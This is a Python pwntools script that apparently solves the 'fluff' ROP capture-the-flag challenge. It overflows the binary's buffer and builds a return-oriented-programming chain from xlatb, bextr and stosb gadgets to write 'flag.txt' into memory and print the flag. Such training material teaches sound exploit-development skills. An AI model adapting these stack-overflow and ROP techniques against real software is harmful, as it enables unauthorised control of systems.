import time

from pwn import *


EXECUTABLE = "./fluff"
context.binary = elf = ELF(EXECUTABLE)
lib_fluff = ELF("./libfluff.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    log.success(f"Offset found: {offset}")
    exit()


flag_addr = elf.symbols.data_start
file_name = b"flag.txt"

char_lookup = {}
# Build char lookup
for c in file_name:
    if not c in char_lookup.keys():
        char_lookup[c.to_bytes(1, byteorder="little")] = next(elf.search(c))


rop = ROP(elf)

# Load string into memory

# Load rdi
rop(rdi=flag_addr)
# Set rax to 0
rop.raw(0x400610) # mov eax, 0; pop rbp; ret;
rop.raw(b"baaacaaa")  # Garbage for rbp

rax_value = 0
for i, c in enumerate(file_name):
    c = c.to_bytes(1, byteorder="little")
    # Load rbx
    rop.raw(elf.symbols.questionableGadgets + 0x02) # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    rop.raw(0x4000) # rdx
    rop.raw(char_lookup[c] - rax_value - 0x3ef2) # rdx
    # Now bextr loads the first 64 bits (thus all bits) from rdx into rbx
    # https://www.felixcloutier.com/x86/bextr

    # * xlatb
    # al <- [bx + al]
    # https://www.felixcloutier.com/x86/xlat:xlatb
    rop.raw(elf.symbols.questionableGadgets) # xlatb; ret;

    # Store the character at the correct location
    # https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq
    rop.raw(elf.symbols.questionableGadgets + 0x11) # stosb byte ptr [rdi], al; ret;

    # Rax is now updated
    rax_value = ord(c)

# Call print_file
rop.print_file(flag_addr)

log.debug("Sending rop chain:\n" + rop.dump())
p.sendafter(b"> ", flat({ OFFSET: rop.chain() }))
p.recvline() # Thank you

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
